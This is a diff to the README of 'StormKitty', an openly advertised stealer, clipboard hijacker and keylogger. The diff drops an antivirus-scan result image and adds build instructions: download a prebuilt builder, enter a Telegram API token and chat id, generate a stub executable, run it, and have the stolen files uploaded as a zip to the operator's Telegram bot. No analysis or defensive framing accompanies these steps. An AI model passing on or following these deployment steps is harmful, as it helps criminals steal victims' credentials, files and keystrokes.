@@ -1,4 +1,3 @@
-<h2> Under-Construction</h2>
 <p align="center">
   <img src="https://i.ibb.co/HhmVR2v/logo.png"> <br>
   <b>Stealer + Clipper + Keylogger</b> <br>
@@ -53,7 +52,10 @@ By using this software, you automatically agree to the above.
 
 ***
 
-# :eye: Detection:
-<p align="center">
-  <img src="https://antiscan.me/images/result/AkeZGzsBqkET.png">
-</p>
+# 📦 Build 
+
+  1. Download <a href="https://github.com/swagkarna/StormKitty/releases/tag/stormkitty-prebuild">build.zip</a>
+  2. Open StormKittyBuilder.exe and enter telegram api and chat id
+  3. after building you will find exe file in `stub/build.exe` folder
+  4. Run `build.exe` make sure `dotnetzip.dll` and build.exe are in same path
+  5. All stealed files will be uploaded to your telegram-bot as zip file
